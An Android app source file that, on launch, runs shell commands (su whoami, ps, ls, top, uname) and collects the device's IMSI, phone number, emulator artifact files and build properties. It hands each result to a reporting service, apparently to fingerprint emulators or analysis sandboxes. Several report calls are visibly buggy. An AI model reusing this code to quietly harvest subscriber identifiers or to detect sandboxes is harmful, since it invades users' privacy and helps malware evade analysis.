package com.rosetta.dynamit;

import android.Manifest;
import android.content.Intent;
import android.os.Build;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.TextView;

import java.io.File;
import java.lang.reflect.Array;
import java.text.DateFormat;
import java.util.ArrayList;
import java.util.Date;

public class MainActivity extends AppCompatActivity {

    public static final String DATA_KEY = "data";
    public static final ArrayList<String> EMULATOR_PATHS = new ArrayList<String>() {{
        add("/dev/socket/qemud");
        add("/dev/qemu_pipe");
        add("/system/lib/libc_malloc_debug_qemu.so");
        add("/sys/qemu_trace");
        add("/system/bin/qemu-props");
        add("/dev/socket/genyd");
        add("/dev/socket/baseband_genyd");
    }};

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d("Philae", "up and running");

        ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_PHONE_STATE}, 1);
        startProbing();

    }

    public void prepareAndReport(Intent reportIntent, String key, String data){
        reportIntent.putExtra(DATA_KEY, key + ":" + data);
        startService(reportIntent);
    }


    public void startProbing(){
        Intent reportServiceIntent = new Intent(this, ReportService.class);

//        reportServiceIntent.putExtra(DATA_KEY, "DANGO -> 01");
//        startService(reportServiceIntent);

//        String shellSudoRes = Shell.sudo("screenrecord --time-limit 10 /sdcard/MyVideo.mp4");
//        reportServiceIntent.putExtra(DATA_KEY, shellSudoRes);
//        startService(reportServiceIntent);

        String firstDateTimeString = DateFormat.getDateTimeInstance().format(new Date());
        Log.d("TIMESTAMP:", firstDateTimeString);
//        reportServiceIntent.putExtra(DATA_KEY, "first time stamp: " + firstDateTimeString);
//        startService(reportServiceIntent);
        prepareAndReport(reportServiceIntent, "first_internal_time_stamp", firstDateTimeString);

        String shellEmptyShell = Shell.sudo("whoami");
//        reportServiceIntent.putExtra(DATA_KEY, shellEmptyShell);
//        startService(reportServiceIntent);
        prepareAndReport(reportServiceIntent, "whoami", firstDateTimeString);


        String shellPSRes = Shell.userCmd("ps");
//        reportServiceIntent.putExtra(DATA_KEY, shellPSRes);
//        startService(reportServiceIntent);
        prepareAndReport(reportServiceIntent, "ps", shellPSRes);


        String shellLSRes = Shell.userCmd("ls");
//        reportServiceIntent.putExtra(DATA_KEY, shellLSRes);
//        startService(reportServiceIntent);
        prepareAndReport(reportServiceIntent, "ls", shellLSRes);


        String shellTOPRes = Shell.userCmd("top -n 1");
//        reportServiceIntent.putExtra(DATA_KEY, shellTOPRes);
//        startService(reportServiceIntent);
        prepareAndReport(reportServiceIntent, "top", shellTOPRes);


        String shellWhoAmIRes = Shell.userCmd("whoami");
//        reportServiceIntent.putExtra(DATA_KEY, shellWhoAmIRes);
//        startService(reportServiceIntent);
        prepareAndReport(reportServiceIntent, "top", shellTOPRes);


        String shellKernelVersion = Shell.userCmd("uname -a");
//        reportServiceIntent.putExtra(DATA_KEY, shellKernelVersion);
//        startService(reportServiceIntent);
        prepareAndReport(reportServiceIntent, "kernel_version", shellKernelVersion);


//        reportServiceIntent.putExtra(DATA_KEY, "IMSI:" getImsi());
//        startService(reportServiceIntent);
        prepareAndReport(reportServiceIntent, "IMSI", getImsi());


 /*       reportServiceIntent.putExtra(DATA_KEY, "phone_number: " + getPhoneNumber());
        startService(reportServiceIntent);*/
        prepareAndReport(reportServiceIntent, "phone_number", getPhoneNumber());


        /*reportServiceIntent.putExtra(DATA_KEY, "IMEI: " + getIMEI());
        startService(reportServiceIntent);
*/
//        reportServiceIntent.putExtra(DATA_KEY, "emulator_files: " + getEmulatorFiles(EMULATOR_PATHS));
//        startService(reportServiceIntent);
        prepareAndReport(reportServiceIntent, "emulator_files",  getEmulatorFiles(EMULATOR_PATHS));


//        reportServiceIntent.putExtra(DATA_KEY, "build_props: " + getBuildProps());
//        startService(reportServiceIntent);
        prepareAndReport(reportServiceIntent, "build_props", getBuildProps());



        String secondDateTimeString = DateFormat.getDateTimeInstance().format(new Date());
//        reportServiceIntent.putExtra(DATA_KEY, "second_internal_time_stamp: " + secondDateTimeString);
//        startService(reportServiceIntent);
        prepareAndReport(reportServiceIntent, "second_internal_time_stamp", secondDateTimeString);

    }

    public String getImsi(){
        TelephonyManager telephonyManager = (TelephonyManager) this.getSystemService(this.TELEPHONY_SERVICE);
        String imsi = telephonyManager.getSubscriberId();
        Log.d("test_apis-imsi", imsi);
        return imsi;
    }

    public String getPhoneNumber() {
        TelephonyManager telephonyManager = (TelephonyManager) this.getSystemService(this.TELEPHONY_SERVICE);
        String phoneNumber = telephonyManager.getLine1Number();

        Log.d("test_apis-phone-number", phoneNumber);
        return phoneNumber;
    }

    public String getIMEI() {
        TelephonyManager telephonyManager = (TelephonyManager) this.getSystemService(this.TELEPHONY_SERVICE);
        String IMEI = telephonyManager.getDeviceId();

        Log.d("test_apis-IMEI", IMEI);
        return IMEI;
    }

    public String getEmulatorFiles(ArrayList<String> paths) {
        ArrayList<String> foundPaths = new ArrayList<>();

        for (String path:paths) {
            if (new File(path).exists()) {
                foundPaths.add(path);
            }
        }

        Log.d("test_emulator_files", foundPaths.toString());
        return foundPaths.toString();
    }


    public String getBuildProps(){

        String found = new String();

        String BOARD = android.os.Build.BOARD; // The name of the underlying board, like "unknown".
        // This appears to occur often on real hardware... that's sad
         String BOOTLOADER = android.os.Build.BOOTLOADER; // The system bootloader version number.
        String BRAND = android.os.Build.BRAND; // The brand (e.g., carrier) the software is customized for, if any.
        // "generic"
        String DEVICE = android.os.Build.DEVICE; // The name of the industrial design. "generic"
        String HARDWARE = android.os.Build.HARDWARE; // The name of the hardware (from the kernel command line or
        // /proc). "goldfish"
        String MODEL = android.os.Build.MODEL; // The end-user-visible name for the end product. "sdk"
        String PRODUCT = android.os.Build.PRODUCT; // The name of the overall product.
        String HOST = android.os.Build.HOST;
        String ID = android.os.Build.ID;
        String MANUFACTURER = android.os.Build.MANUFACTURER;
        String TYPE = Build.TYPE;
        String USER = Build.USER;

        //until 21
        String ABIS= Build.CPU_ABI;
        //after 21
        //String ABIS= Build.SUPPORTED_ABIS[0];

        found = found + "Board: " + BOARD;
        found = found + "BootLoader: " + BOOTLOADER;
        found = found + "Brand: " + BRAND;
        found = found + "Device: " + DEVICE;
        found = found + "Hardware: " + HARDWARE;
        found = found + "Model: " + MODEL;
        found = found + "Product: " + PRODUCT;
        found = found + "Host: " + HOST;
        found = found + "Id: " + ID;
        found = found + "Manufacturer: " + MANUFACTURER;
        found = found + "Type: " + TYPE;
        found = found + "User: " + USER;
        found = found + "Abis: " + ABIS;

        /*if ((BOARD.compareTo("unknown") == 0) *//* || (BOOTLOADER.compareTo("unknown") == 0) *//*
                || (BRAND.compareTo("generic") == 0) || (DEVICE.compareTo("generic") == 0)
                || (MODEL.compareTo("sdk") == 0) || (PRODUCT.compareTo("sdk") == 0)
                || (HARDWARE.compareTo("goldfish") == 0)) {
            return true;
        }*/

        Log.d("test_buildProps:", found.toString());

        return found;
    }
}
